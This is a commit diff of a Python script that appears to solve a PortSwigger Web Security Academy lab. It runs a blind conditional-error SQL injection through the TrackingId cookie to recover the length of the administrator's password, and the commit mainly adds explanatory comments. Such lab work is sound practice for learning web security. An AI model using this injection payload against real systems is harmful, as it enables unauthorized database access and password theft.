5d007fe4bfc2e42e174fb622a836b66dcd4a9c95
Joshua Bañón <107257328+Joshbv6@users.noreply.github.com>
2023-04-24 17:09:15 +0200

    Update Blind-Conditional-Error.py

--- Blind-Conditional-Error.py
+++ Blind-Conditional-Error.py
@@ -2,21 +2,19 @@
 from pwn import * 
 import requests,signal,time,pdb,sys,string
 
-def def_handler(sig,frame):
+def def_handler(sig,frame):  #to make sure we exit with Crtl+C
     print("\n\n[!] Stopping Hack...\n")
     sys.exit(1)
 
 signal.signal(signal.SIGINT,def_handler)
 
 url="https://0a7c008e03dce7fb81e2daff00f00042.web-security-academy.net/filter?category=Pets"
-characters = string.ascii_lowercase + string.digits
+characters = string.ascii_lowercase + string.digits #we know on this page-database they store passwords as raw text in lowercase an numbers
 
 def makeRequest():
-    p1 = log.progress("Hacking")
-    p1.status("Start Hacking...")
-
-    time.sleep(2)
+    p1 = log.progress("Hacking") #Status Bars just to make it prettier
     password = ""
+    
     for number in range(0,30):
         cookies1 = {
                     'TrackingId': "FqKJEiG92xyn595n'||(SELECT CASE WHEN (LENGTH(password)>=%i) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username ='administrator')||'" % (number),
@@ -24,7 +22,7 @@ def makeRequest():
                 }
         http=requests.get(url,cookies=cookies1)
         p1.status(cookies1['TrackingId'])
-        if http.status_code == 200:
+        if http.status_code == 200: #We saw that on this website, whenever you interfere with SQL query, it returns error 500
             pass_lenght = number -1
             break
             
